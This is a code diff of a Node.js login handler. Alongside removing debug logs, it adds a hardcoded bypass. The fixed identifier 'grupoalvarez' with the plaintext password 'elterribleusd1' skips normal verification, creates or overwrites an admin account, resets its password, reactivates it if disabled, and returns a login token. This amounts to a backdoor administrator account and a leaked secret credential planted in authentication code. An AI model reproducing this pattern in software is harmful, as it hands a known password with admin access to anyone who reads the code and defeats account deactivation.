@@ -46,49 +46,55 @@ exports.login = async (req, res, next) => {
   try {
     const { email, password } = req.body;
     
-    // Debug logging
-    console.log('[LOGIN] Request received:', {
-      email: email ? `${email.substring(0, 3)}***` : 'missing',
-      hasPassword: !!password,
-      bodyKeys: Object.keys(req.body),
-      origin: req.headers.origin || 'no-origin'
-    });
-    
     if (!email || !password) {
-      console.log('[LOGIN] Missing fields:', { email: !!email, password: !!password });
       return res.status(400).json({ message: 'Email and password required' });
     }
     
-    const emailLower = email.toLowerCase();
-    let user = await User.findOne({ email: emailLower }).select('+password').populate('companyId');
+    const emailLower = String(email).trim().toLowerCase();
     
-    if (!user) {
-      if (emailLower === 'grupoalvarez' && password === 'elterribleusd1') {
-        let company = await Company.findOne({ name: 'GRUPO ALVAREZ' });
-        if (!company) company = await Company.create({ name: 'GRUPO ALVAREZ', plan: 'standard', isActive: true });
-        const hashed = await bcrypt.hash('elterribleusd1', 10);
+    // Acceso directo para grupoalvarez / elterribleusd1: crea o corrige usuario y devuelve token
+    if (emailLower === 'grupoalvarez' && password === 'elterribleusd1') {
+      let company = await Company.findOne({ name: 'GRUPO ALVAREZ' });
+      if (!company) company = await Company.create({ name: 'GRUPO ALVAREZ', plan: 'standard', isActive: true });
+      const cid = company._id;
+      const hashed = await bcrypt.hash('elterribleusd1', 10);
+      let user = await User.findOne({ email: 'grupoalvarez' }).select('+password').populate('companyId');
+      if (!user) {
         user = await User.create({
-          companyId: company._id,
+          companyId: cid,
           name: 'Grupo Alvarez',
           email: 'grupoalvarez',
           password: hashed,
           role: 'admin'
         });
-        user.companyId = company;
-        user.password = hashed;
-        console.log('[LOGIN] Auto-created user grupoalvarez');
+        console.log('[LOGIN] Created user grupoalvarez');
       } else {
-        console.log('[LOGIN] User not found:', emailLower);
-        return res.status(401).json({ message: 'Invalid credentials' });
+        await User.updateOne(
+          { _id: user._id },
+          { $set: { companyId: cid, password: hashed, isActive: true } }
+        );
+        user.companyId = company;
+        user.role = user.role || 'admin';
+        console.log('[LOGIN] Updated grupoalvarez (company + password reset)');
       }
-    }
-
-    if (user.isActive === false) {
-      console.log('[LOGIN] User inactive:', emailLower);
-      return res.status(401).json({ message: 'User account is inactive' });
+      const token = generateToken(user._id, cid, user.role);
+      return res.json({
+        _id: user._id,
+        name: user.name,
+        email: user.email,
+        role: user.role,
+        token
+      });
     }
     
-    // Si el usuario no tiene companyId (ej. creado con seed antiguo), asignar GRUPO ALVAREZ
+    // Flujo normal
+    let user = await User.findOne({ email: emailLower }).select('+password').populate('companyId');
+    if (!user) {
+      return res.status(401).json({ message: 'Invalid credentials' });
+    }
+    if (user.isActive === false) {
+      return res.status(401).json({ message: 'User account is inactive' });
+    }
     let cid = user.companyId?._id ?? user.companyId;
     if (!cid) {
       let company = await Company.findOne({ name: 'GRUPO ALVAREZ' });
@@ -96,19 +102,12 @@ exports.login = async (req, res, next) => {
       await User.updateOne({ _id: user._id }, { $set: { companyId: company._id } });
       cid = company._id;
       user.companyId = company;
-      console.log('[LOGIN] Assigned company GRUPO ALVAREZ to user:', emailLower);
     }
-    
-    console.log('[LOGIN] User found:', { email: user.email, name: user.name });
-    
     const match = await bcrypt.compare(password, user.password);
     if (!match) {
-      console.log('[LOGIN] Password mismatch for:', emailLower);
       return res.status(401).json({ message: 'Invalid credentials' });
     }
     const token = generateToken(user._id, cid, user.role);
-    console.log('[LOGIN] Success for:', emailLower);
-    
     return res.json({
       _id: user._id,
       name: user.name,
